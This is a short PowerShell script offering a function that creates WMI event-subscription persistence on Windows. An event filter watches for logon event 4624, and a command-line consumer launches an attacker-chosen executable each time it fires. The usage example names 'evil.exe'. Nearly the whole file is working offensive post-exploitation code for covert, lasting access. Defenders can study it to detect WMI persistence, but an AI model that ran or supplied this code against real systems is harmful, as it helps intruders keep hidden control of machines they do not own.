<#
.SYNOPSIS
Function that will create logon persistence similar to the CurrentVersion\Run keys.  Logs the Event Log for Event Code 4624 (User Logged On)
with WMI and executes the given binary when that happens.

.DESCRIPTION
Function that will create logon persistence similar to the CurrentVersion\Run keys.  Logs the Event Log for Event Code 4624 (User Logged On)
with WMI and executes the given binary when that happens.

.EXAMPLE
PS> Invoke-EventlogLogonPersistence -FilterName "Custom Filter Name" -ConsumerName "Custom Consumer" -EXEPath 'c:\windows\system32\evil.exe'

#>



function Invoke-EventlogLogonPersistence
{
    Param(
        [string]$FilterName   = "LogonEvents",
        [string]$ConsumerName = "LogonHandler",
        [Parameter(Mandatory=$true)]
        [string]$EXEPath
        )

    $Query = "Select * from __InstanceCreationEvent where TargetInstance ISA 'Win32_NTLogEvent' and TargetInstance.EventCode = '4624'" 
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$FilterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop 
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Argument @{Name=$ConsumerName;ExecutablePath=$exePath;CommandLineTemplate=$exePath} 
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer} 
}
